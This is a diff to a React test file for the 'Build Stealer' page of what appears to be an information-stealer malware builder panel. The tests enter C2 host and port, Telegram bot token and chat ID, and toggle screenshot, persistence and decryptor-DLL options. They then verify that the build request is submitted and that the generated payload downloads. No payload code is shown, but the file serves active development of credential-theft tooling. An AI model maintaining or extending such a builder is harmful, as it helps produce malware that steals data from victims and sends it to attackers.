@@ -61,9 +61,8 @@ describe('BuildPage', () => {
 
   it('renders build history from api.get', async () => {
     renderPage()
-    await screen.findByText('v1')
-    const table = screen.getByRole('table')
-    expect(within(table).getByText('v1')).toBeInTheDocument()
+    const table = await screen.findByRole('table')
+    expect(await within(table).findAllByText('v1')).toHaveLength(2)
     expect(within(table).getByText('abcdef123456..')).toBeInTheDocument()
     expect(within(table).getByText('200 KB')).toBeInTheDocument()
     expect(within(table).getByText('3')).toBeInTheDocument()
@@ -86,32 +85,38 @@ describe('BuildPage', () => {
     expect(screen.getByRole('heading', { name: 'Build Stealer' })).toBeInTheDocument()
   })
 
-  it('edits config fields and submits a build via api.post', async () => {
+  it('edits config fields and submits the full build config via api.post', async () => {
     renderPage()
+    fireEvent.change(screen.getByLabelText('Build Name'), { target: { value: 'my-build' } })
     fireEvent.change(screen.getByLabelText('C2 Host'), { target: { value: '1.2.3.4' } })
     fireEvent.change(screen.getByLabelText('C2 Port'), { target: { value: '9999' } })
     fireEvent.change(screen.getByLabelText('Telegram Bot Token'), { target: { value: 'tg-tok' } })
     fireEvent.change(screen.getByLabelText('Telegram Chat ID'), { target: { value: 'tg-chat' } })
     fireEvent.change(screen.getByLabelText('Build Tag'), { target: { value: 'my-tag' } })
+
+    fireEvent.click(screen.getByText('Modules'))
+    fireEvent.click(screen.getByText('System'))
     fireEvent.click(screen.getByLabelText('Enable Screenshot'))
+    fireEvent.click(screen.getByText('Advanced'))
     fireEvent.click(screen.getByLabelText('Enable Persistence'))
-    fireEvent.click(screen.getByLabelText('Enable Grabber'))
     fireEvent.click(screen.getByLabelText('Include Decryptor DLL'))
+
     fireEvent.click(screen.getByRole('button', { name: 'Build' }))
     await waitFor(() =>
-      expect(vi.mocked(api.post)).toHaveBeenCalledWith('/api/build', {
+      expect(vi.mocked(api.post)).toHaveBeenCalledWith('/api/build', expect.objectContaining({
+        build_name: 'my-build',
         c2_host: '1.2.3.4',
         c2_port: 9999,
         telegram_token: 'tg-tok',
         telegram_chat_id: 'tg-chat',
-        enable_persistence: true,
-        enable_screenshot: false,
-        enable_grabber: false,
-        include_decryptor: false,
         build_tag: 'my-tag',
-      })
+        persistence: true,
+        include_decryptor: false,
+        modules: expect.objectContaining({
+          system: expect.objectContaining({ screenshot: false }),
+        }),
+      }))
     )
-    // success box (text prefixed with an emoji, so use a regex)
     expect(await screen.findByText(/Build complete/)).toBeInTheDocument()
     expect(screen.getByText(/300\.0 KB/)).toBeInTheDocument()
     expect(screen.getByText(/f00dface1234567890abcdef1234567890/)).toBeInTheDocument()
@@ -120,6 +125,7 @@ describe('BuildPage', () => {
   it('shows an error box when the build fails', async () => {
     vi.mocked(api.post).mockRejectedValue(new Error('compile error'))
     renderPage()
+    fireEvent.change(screen.getByLabelText('Build Name'), { target: { value: 'my-build' } })
     fireEvent.click(screen.getByRole('button', { name: 'Build' }))
     expect(await screen.findByText(/Build failed: compile error/)).toBeInTheDocument()
   })
@@ -133,8 +139,8 @@ describe('BuildPage', () => {
       blob: vi.fn().mockResolvedValue(new Blob(['payload'])),
     } as unknown as Response)
     renderPage()
-    await screen.findByText('v1')
-    const table = screen.getByRole('table')
+    const table = await screen.findByRole('table')
+    await within(table).findAllByText('v1')
     fireEvent.click(within(table).getAllByRole('button')[0])
     await waitFor(() => expect(clickSpy).toHaveBeenCalled())
     expect(fetch).toHaveBeenCalledWith('/api/build/bld-11111111/download', {
@@ -148,8 +154,8 @@ describe('BuildPage', () => {
     const errorSpy = vi.spyOn(console, 'error').mockImplementation(() => {})
     vi.mocked(fetch).mockResolvedValue({ ok: false } as unknown as Response)
     renderPage()
-    await screen.findByText('v1')
-    const table = screen.getByRole('table')
+    const table = await screen.findByRole('table')
+    await within(table).findAllByText('v1')
     fireEvent.click(within(table).getAllByRole('button')[0])
     await waitFor(() => expect(errorSpy).toHaveBeenCalledWith('Build download failed:', expect.any(Error)))
   })
